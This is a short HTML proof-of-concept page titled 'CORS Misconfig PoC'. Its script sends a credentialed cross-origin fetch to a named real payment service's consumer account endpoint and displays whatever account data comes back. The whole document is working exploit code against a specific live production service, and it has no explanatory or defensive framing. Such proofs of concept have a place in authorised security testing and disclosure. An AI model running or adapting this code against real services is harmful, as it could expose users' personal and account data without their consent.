<!DOCTYPE html>
<html>
  <head>
    <title>CORS Misconfig PoC</title>
  </head>
  <body>
    <h1>🔥 CORS Misconfig PoC</h1>
    <button onclick="exploit()">🔥 Test Endpoint</button>
    <pre id="output">Waiting...</pre>

    <script>
      async function exploit() {
        const output = document.getElementById('output');
        output.textContent = 'Sending request...';

        try {
          const response = await fetch('https://portalapi.us.afterpay.com/portal/consumers/account', {
            method: 'GET',
            mode: 'cors',
            credentials: 'include', // Can also try 'omit'
            headers: {
              'Content-Type': 'application/json'
            }
          });

          const data = await response.text();
          output.textContent = `✅ Response:\n${data}`;
        } catch (err) {
          output.textContent = `❌ Error:\n${err}`;
        }
      }
    </script>
  </body>
</html>
